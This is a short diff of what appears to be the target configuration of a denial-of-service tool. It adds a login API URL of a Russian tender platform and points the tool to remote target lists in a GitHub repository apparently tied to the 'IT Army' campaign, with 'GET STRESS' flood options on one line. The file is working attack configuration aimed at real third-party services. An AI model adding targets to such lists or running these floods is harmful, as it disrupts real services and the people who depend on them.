@@ -1,3 +1,4 @@
+https://market-lk.rts-tender.ru/api/common/v1/sso/login/participantCustomer?sso=1&code=-5
 -c https://raw.githubusercontent.com/ifest1val/itarmy/main/address/tender_target_tcp
 -c https://raw.githubusercontent.com/ifest1val/itarmy/main/address/tender_target_url
 -c https://raw.githubusercontent.com/ifest1val/itarmy/main/address/tender_target_tcp  --http-methods GET STRESS
